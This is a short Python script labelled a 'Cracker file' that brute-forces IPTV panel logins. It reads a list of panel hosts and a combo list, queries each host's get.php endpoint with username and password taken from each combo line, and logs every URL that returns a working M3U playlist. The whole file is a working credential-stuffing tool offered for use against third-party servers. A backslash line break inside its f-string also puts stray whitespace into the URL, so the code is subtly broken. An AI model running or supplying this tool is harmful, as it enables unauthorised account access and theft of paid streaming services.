# -*- coding: utf-8 -*-
"""Cracker file"""
from sys import argv

from requests import get
from requests.exceptions import HTTPError


def brute_accounts(panels_url, combo_file):
    """Bruteforce function"""
    for user in open(combo_file, 'r', encoding="utf-8").readlines():
        print(f"[i] Trying combo: {user.strip()}")
        for url in open(panels_url, "r", encoding="utf-8").readlines():
            try:
                account_to_try = f"http://{url.strip()}/get.php?\
                    username={user.strip()}&password={user.strip()}&type=m3u&output=ts"
                if "#EXTINF:0" in get(account_to_try, timeout=15, stream=True).text:
                    print(f"[+] Playlist URL found: {account_to_try}")
                    with open("logs.txt", "a+", encoding="utf-8") as log_file:
                        log_file.write(f"{account_to_try}\n")
                        log_file.close()
            except HTTPError as http_error:
                print(http_error)

if __name__ == '__main__':
    try:
        url_list = argv[1]
        comboFile = argv[2]
        print(f"[+] Loaded {len(open(url_list, 'r', encoding='utf-8').readlines())} URL_list!")
        brute_accounts(url_list, comboFile)
    except HTTPError as http_err:
        print(http_err)
